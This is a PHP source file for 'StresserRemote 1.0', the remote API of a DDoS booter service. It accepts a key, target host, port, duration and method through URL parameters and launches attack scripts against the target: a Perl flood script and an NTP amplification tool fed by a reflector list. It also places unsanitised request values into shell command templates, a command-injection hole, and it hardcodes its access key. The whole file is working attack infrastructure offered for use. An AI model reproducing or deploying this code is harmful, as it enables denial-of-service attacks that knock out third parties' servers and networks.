<?php
/**
 *  StresserRemote 1.0 - The Best Way To Use Remote API Of Stressers
 *
 *  @author Alemalakra
 *  @version 1.0
 */


// Library

require('src/stresser-remote.php');


// Configuration

$Configuration['Key'] = 'Alemalakra007';


// Methods, Variables: [host] [port] [time] [method]

$Methods = array(
				 'Alemalakra' => array(
				 					   'Name' => 'Alemalakra',
				 					   'Command' => 'perl alemalakra.pl [host] [port] 6000 [time]',
									   'Directory' => 'scripts',
									   'Max Time' => 3500),
				 'NTP' => array(
				 				'Name' => 'NTP',
				 				'Command' => './ntp [host] [port] [time] lists.txt',
								'Directory' => 'scripts',
								'Max Time' => 3500)

				 );

// Load Class

$StresserRemote = new StresserRemote;
$StresserRemote->checkDependencies();
$StresserRemote->getVariables();
$Key = $_GET['key'];
$IP = $_GET['host'];
$Port = $_GET['port'];
$Time = $_GET['time'];
$Method = $_GET['method'];

// Start API

if ($Configuration['Key'] == $Key) {
	if ($Method == 'stop') {
		$StresserRemote->stop($IP);
	} else {
		foreach($Methods as $MethodL) {
			if ($Method == $MethodL['Name']) {
				if ($Time > $MethodL['Max Time']) {
					die('The Max Time Of this Method Is ' . $MethodL['Max Time']);
				}
				$StresserRemote->attack($IP, $Port, $Time, $Method, $Methods);
			}
		}
		die('Method No Found!');
	}
} else {
	die('Invalid Key!');
}
?>
